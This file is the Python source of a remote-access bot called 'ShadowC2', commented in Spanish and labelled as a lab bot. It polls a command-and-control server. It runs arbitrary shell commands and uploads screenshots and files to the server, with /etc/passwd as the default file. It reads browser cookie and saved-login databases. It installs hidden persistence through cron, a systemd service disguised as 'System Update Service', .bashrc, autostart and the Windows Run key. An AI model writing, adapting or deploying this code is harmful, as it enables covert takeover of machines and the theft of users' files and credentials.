#!/usr/bin/env python3
"""
ShadowC2 Bot - Modo CLEAR (sin ofuscacion)
Bot completo con todas las capacidades para laboratorio.
"""

import base64
import json
import os
import platform
import shutil
import socket
import sqlite3
import subprocess
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path

import psutil
import requests
from PIL import ImageGrab

# CONFIGURACION
C2_URL = os.environ.get("C2_URL", "http://localhost:8000")
CHECK_INTERVAL = 5

class BotClear:
    def __init__(self):
        self.bot_id = str(uuid.uuid4())[:8]
        self.hostname = socket.gethostname()
        self.username = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
        self.os_info = f"{platform.system()} {platform.release()}"
        self.session = requests.Session()
        self.keylogger_active = False
        self.keylog_buffer = []
        
    def register(self):
        """Registrarse en el C2."""
        data = {
            "bot_id": self.bot_id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_info,
            "capabilities": ["shell", "screenshot", "keylog", "download", "upload", 
                           "persist", "info", "cookies", "passwords", "processes"]
        }
        try:
            r = self.session.post(f"{C2_URL}/c2/clear/register", json=data, timeout=10)
            result = r.json()
            if result.get("bot_id"):
                self.bot_id = result["bot_id"]
            print(f"[+] Registrado como {self.bot_id}")
            return True
        except Exception as e:
            print(f"[-] Error registro: {e}")
            return False
    
    def heartbeat(self):
        try:
            self.session.post(f"{C2_URL}/c2/clear/heartbeat/{self.bot_id}", timeout=5)
        except:
            pass
    
    def check_commands(self):
        try:
            r = self.session.get(f"{C2_URL}/c2/clear/check/{self.bot_id}", timeout=10)
            data = r.json()
            return data.get("commands", [])
        except:
            return []
    
    def send_result(self, cmd_id, result):
        try:
            self.session.post(f"{C2_URL}/c2/clear/result/{self.bot_id}", 
                          json={"cmd_id": cmd_id, "result": result}, timeout=10)
        except:
            pass
    
    # ============ CAPACIDADES COMPLETAS ============
    
    def execute_shell(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=30)
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"error": "Timeout"}
        except Exception as e:
            return {"error": str(e)}
    
    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            filename = f"/tmp/ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            screenshot.save(filename)
            
            with open(filename, 'rb') as f:
                self.session.post(f"{C2_URL}/c2/clear/screenshot/{self.bot_id}",
                                files={"file": f}, timeout=30)
            
            os.remove(filename)
            return {"status": "screenshot enviado"}
        except Exception as e:
            return {"error": str(e)}
    
    def get_system_info(self):
        return {
            "cpu_count": os.cpu_count(),
            "memory_total": psutil.virtual_memory().total,
            "memory_used": psutil.virtual_memory().used,
            "disk_usage": dict(psutil.disk_usage('/')._asdict()),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
            "ppid": os.getppid(),
            "env": dict(os.environ),
            "network_interfaces": psutil.net_if_addrs(),
            "boot_time": psutil.boot_time(),
            "users": [u._asdict() for u in psutil.users()]
        }
    
    def get_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(proc.info)
            except:
                pass
        return {"processes": processes[:100]}  # Limitar a 100
    
    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return {"error": "Archivo no encontrado"}
            
            filename = os.path.basename(filepath)
            with open(filepath, 'rb') as f:
                self.session.post(f"{C2_URL}/c2/clear/file/{self.bot_id}",
                                files={"file": (filename, f)},
                                data={"path": filepath}, timeout=30)
            return {"status": "archivo subido", "filename": filename, "size": os.path.getsize(filepath)}
        except Exception as e:
            return {"error": str(e)}
    
    def upload_file(self, url, destination):
        try:
            r = requests.get(url, timeout=30)
            with open(destination, 'wb') as f:
                f.write(r.content)
            return {"status": "archivo descargado", "path": destination, "size": len(r.content)}
        except Exception as e:
            return {"error": str(e)}
    
    def establish_persistence(self):
        try:
            system = platform.system()
            if system == "Linux":
                # Metodo 1: Cron
                cron = f"(crontab -l 2>/dev/null; echo '@reboot python3 {os.path.abspath(__file__)}') | crontab -"
                subprocess.run(cron, shell=True)
                
                # Metodo 2: Systemd user
                systemd_dir = Path.home() / ".config" / "systemd" / "user"
                systemd_dir.mkdir(parents=True, exist_ok=True)
                
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
                (systemd_dir / "update.service").write_text(service_content)
                subprocess.run("systemctl --user daemon-reload", shell=True)
                subprocess.run("systemctl --user enable update.service", shell=True)
                
                # Metodo 3: Bashrc
                bashrc = Path.home() / ".bashrc"
                with open(bashrc, 'a') as f:
                    f.write(f"\n# System update check\npython3 {os.path.abspath(__file__)} &\n")
                
                # Metodo 4: Desktop entry (autostart)
                autostart_dir = Path.home() / ".config" / "autostart"
                autostart_dir.mkdir(parents=True, exist_ok=True)
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=UpdateManager
Exec=python3 {os.path.abspath(__file__)}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
                (autostart_dir / "update.desktop").write_text(desktop_entry)
                
                return {"method": "multi", "status": "persistencia establecida", 
                       "methods": ["cron", "systemd", "bashrc", "autostart"]}
                
            elif system == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "ShadowUpdate", 0, winreg.REG_SZ, 
                                sys.executable + " " + os.path.abspath(__file__))
                winreg.CloseKey(key)
                return {"method": "registry", "status": "persistencia establecida"}
            else:
                return {"error": "OS no soportado"}
        except Exception as e:
            return {"error": str(e)}
    
    def extract_cookies(self):
        """Extraer cookies de navegadores."""
        cookies = {}
        home = Path.home()
        
        # Chrome/Chromium
        chrome_paths = [
            home / ".config" / "google-chrome" / "Default" / "Cookies",
            home / ".config" / "chromium" / "Default" / "Cookies",
            home / ".config" / "BraveSoftware" / "Brave-Browser" / "Default" / "Cookies",
        ]
        
        for path in chrome_paths:
            if path.exists():
                try:
                    conn = sqlite3.connect(str(path))
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies")
                    browser_name = path.parts[-3]
                    cookies[browser_name] = [
                        {"host": row[0], "name": row[1], "value": row[2][:50], "path": row[3]}
                        for row in cursor.fetchall()[:20]  # Limitar
                    ]
                    conn.close()
                except Exception as e:
                    cookies[str(path)] = f"Error: {e}"
        
        # Firefox
        firefox_path = home / ".mozilla" / "firefox"
        if firefox_path.exists():
            for profile in firefox_path.iterdir():
                if profile.is_dir() and profile.name.endswith(".default"):
                    cookies_file = profile / "cookies.sqlite"
                    if cookies_file.exists():
                        try:
                            conn = sqlite3.connect(str(cookies_file))
                            cursor = conn.cursor()
                            cursor.execute("SELECT host, name, value, path FROM moz_cookies")
                            cookies["firefox"] = [
                                {"host": row[0], "name": row[1], "value": row[2][:50], "path": row[3]}
                                for row in cursor.fetchall()[:20]
                            ]
                            conn.close()
                        except Exception as e:
                            cookies["firefox"] = f"Error: {e}"
        
        return {"cookies_found": len(cookies), "browsers": cookies}
    
    def extract_passwords(self):
        """Extraer passwords guardados (demostracion)."""
        passwords = {}
        home = Path.home()
        
        # Chrome Login Data
        chrome_login_paths = [
            home / ".config" / "google-chrome" / "Default" / "Login Data",
            home / ".config" / "chromium" / "Default" / "Login Data",
        ]
        
        for path in chrome_login_paths:
            if path.exists():
                try:
                    conn = sqlite3.connect(str(path))
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    browser_name = path.parts[-3]
                    passwords[browser_name] = [
                        {"url": row[0], "username": row[1], "password": "[ENCRYPTED]"}
                        for row in cursor.fetchall()[:10]
                    ]
                    conn.close()
                except Exception as e:
                    passwords[str(path)] = f"Error: {e}"
        
        # Firefox logins
        firefox_path = home / ".mozilla" / "firefox"
        if firefox_path.exists():
            for profile in firefox_path.iterdir():
                if profile.is_dir() and profile.name.endswith(".default"):
                    logins_file = profile / "logins.json"
                    if logins_file.exists():
                        try:
                            import json
                            data = json.loads(logins_file.read_text())
                            passwords["firefox"] = [
                                {"url": login.get("hostname", ""), 
                                 "username": login.get("encryptedUsername", "")[:30]}
                                for login in data.get("logins", [])[:10]
                            ]
                        except Exception as e:
                            passwords["firefox"] = f"Error: {e}"
        
        return {"passwords_found": sum(len(v) for v in passwords.values() if isinstance(v, list)), 
                "browsers": passwords}
    
    def run(self):
        if not self.register():
            return
        
        print(f"[*] Bot {self.bot_id} iniciado. Conectado a {C2_URL}")
        
        while True:
            try:
                self.heartbeat()
                commands = self.check_commands()
                
                for cmd in commands:
                    cmd_id = cmd["id"]
                    command = cmd["command"]
                    args = json.loads(cmd["args"]) if cmd["args"] else []
                    
                    print(f"[*] Ejecutando: {command} {args}")
                    
                    if command == "shell":
                        result = self.execute_shell(" ".join(args) if args else "whoami")
                    elif command == "screenshot":
                        result = self.take_screenshot()
                    elif command == "info":
                        result = self.get_system_info()
                    elif command == "processes":
                        result = self.get_processes()
                    elif command == "download":
                        result = self.download_file(args[0] if args else "/etc/passwd")
                    elif command == "upload":
                        result = self.upload_file(args[0], args[1]) if len(args) >= 2 else {"error": "Faltan argumentos"}
                    elif command == "persist":
                        result = self.establish_persistence()
                    elif command == "cookies":
                        result = self.extract_cookies()
                    elif command == "passwords":
                        result = self.extract_passwords()
                    elif command == "keylog_start":
                        self.keylogger_active = True
                        result = {"status": "keylogger iniciado"}
                    elif command == "keylog_stop":
                        self.keylogger_active = False
                        result = {"status": "keylogger detenido", "buffer": self.keylog_buffer}
                        self.keylog_buffer = []
                    elif command == "kill":
                        self.send_result(cmd_id, {"status": "killed"})
                        sys.exit(0)
                    else:
                        result = {"error": "Comando desconocido"}
                    
                    self.send_result(cmd_id, result)
                
                time.sleep(CHECK_INTERVAL)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Error en loop: {e}")
                time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    bot = BotClear()
    bot.run()
